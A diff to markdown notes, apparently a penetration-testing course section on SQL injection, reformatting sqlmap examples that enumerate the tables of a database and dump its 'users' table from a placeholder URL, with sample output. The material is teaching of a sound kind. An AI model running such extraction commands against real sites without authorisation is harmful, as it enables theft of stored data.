@@ -1241,17 +1241,47 @@ From the above example, we can see that the database version is quite old (MySQL
 <br>
 </div>
 
-## Table Enumeration
+#### Table Enumeration
 
 In most common scenarios, after finding the current database name (i.e. `testdb`), the retrieval of table names would be by using the `--tables` option and specifying the DB name with `-D testdb`, is as follows:
 
-        shellsession
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb ...SNIP... [13:59:24] [INFO] fetching tables for database: 'testdb' Database: testdb [4 tables] +---------------+ | member        | | data          | | international | | users         | +---------------+`
+```shell
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+
+...SNIP...
+[13:59:24] [INFO] fetching tables for database: 'testdb'
+Database: testdb
+[4 tables]
++---------------+
+| member        |
+| data          |
+| international |
+| users         |
++---------------+
+```
 
 After spotting the table name of interest, retrieval of its content can be done by using the `--dump` option and specifying the table name with `-T users`, as follows:
 
+```shell
         shellsession
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb ...SNIP... Database: testdb Table: users [4 entries] +----+--------+------------+ | id | name   | surname    | +----+--------+------------+ | 1  | luther | blisset    | | 2  | fluffy | bunny      | | 3  | wu     | ming       | | 4  | NULL   | nameisnull | +----+--------+------------+ [14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'`
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+
+...SNIP...
+Database: testdb
+
+Table: users
+[4 entries]
++----+--------+------------+
+| id | name   | surname    |
++----+--------+------------+
+| 1  | luther | blisset    |
+| 2  | fluffy | bunny      |
+| 3  | wu     | ming       |
+| 4  | NULL   | nameisnull |
++----+--------+------------+
+
+[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'
+```
 
 The console output shows that the table is dumped in formatted CSV format to a local file, `users.csv`.
 
